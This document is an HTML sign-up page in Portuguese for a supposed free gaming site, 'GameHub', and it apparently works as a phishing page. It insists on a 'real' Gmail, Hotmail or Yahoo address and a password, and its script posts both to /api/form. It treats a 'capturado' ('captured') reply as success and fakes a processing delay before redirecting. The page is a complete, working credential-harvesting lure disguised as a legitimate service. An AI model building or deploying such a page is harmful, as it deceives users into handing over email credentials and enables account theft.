<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Criar Conta - GameHub</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 400px;
    }

    .card {
      background: rgba(25, 25, 35, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .logo {
      text-align: center;
      margin-bottom: 30px;
    }

    .logo h1 {
      font-size: 28px;
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 5px;
    }

    .logo p {
      color: #aaa;
      font-size: 14px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #ddd;
      font-weight: 500;
    }

    input {
      width: 100%;
      height: 45px;
      padding: 0 15px;
      border-radius: 8px;
      border: 1px solid #444;
      background: rgba(20, 20, 30, 0.7);
      color: #fff;
      font-size: 16px;
      transition: all 0.3s ease;
    }

    input:focus {
      outline: none;
      border-color: #4ecdc4;
      box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2);
    }

    input::placeholder {
      color: #777;
    }

    .btn {
      width: 100%;
      height: 45px;
      background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(78, 205, 196, 0.3);
    }

    .btn:active {
      transform: translateY(0);
    }

    .footer {
      text-align: center;
      margin-top: 25px;
      color: #777;
      font-size: 12px;
    }

    .loading {
      display: none;
      text-align: center;
      margin-top: 20px;
    }

    .spinner {
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 3px solid #4ecdc4;
      width: 20px;
      height: 20px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .error {
      color: #ff6b6b;
      font-size: 14px;
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo">
        <h1>GameHub</h1>
        <p>Crie sua conta para jogar agora</p>
      </div>
      
      <form id="createAccountForm">
        <div class="form-group">
          <label for="email">Email Real</label>
          <input type="email" id="email" name="email" placeholder="ex: usuario@gmail.com" required>
        </div>
        
        <div class="form-group">
          <label for="password">Senha</label>
          <input type="password" id="password" name="password" placeholder="Escolha uma senha forte" required>
        </div>
        
        <div class="form-group">
          <label for="confirmPassword">Confirmar Senha</label>
          <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Digite novamente" required>
        </div>
        
        <div class="loading" id="loadingSpinner">
          <div class="spinner"></div>
          <p>Criando conta...</p>
        </div>
        
        <button type="submit" class="btn">Criar Conta</button>
        
        <div class="error" id="errorMessage">
          Por favor, use um email real
        </div>
      </form>
      
      <div class="footer">
        <p>Jogos grátis para todos os usuários</p>
        <p>© 2023 GameHub - Todos os direitos reservados</p>
      </div>
    </div>
  </div>

  <script>
    document.getElementById('createAccountForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const confirmPassword = document.getElementById('confirmPassword').value;
      const loadingSpinner = document.getElementById('loadingSpinner');
      const errorMessage = document.getElementById('errorMessage');
      
      // Validação de email
      if (!email.includes('@gmail.com') && !email.includes('@hotmail.com') && !email.includes('@yahoo.com')) {
        errorMessage.style.display = 'block';
        return;
      }
      
      // Validação de senhas
      if (password !== confirmPassword) {
        alert('As senhas não coincidem');
        return;
      }
      
      // Mostrar spinner
      loadingSpinner.style.display = 'block';
      
      try {
        const response = await fetch('/api/form', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password }),
          mode: 'cors'
        });
        
        const result = await response.json();
        
        if (result.status === 'capturado') {
          // Simular tempo de processamento
          setTimeout(() => {
            window.location.href = '/success.html';
          }, 1500);
        } else {
          throw new Error(result.message || 'Erro ao criar conta');
        }
      } catch (error) {
        console.error('Erro:', error);
        alert('Erro ao criar conta');
      } finally {
        loadingSpinner.style.display = 'none';
      }
    });
  </script>
</body>
</html>
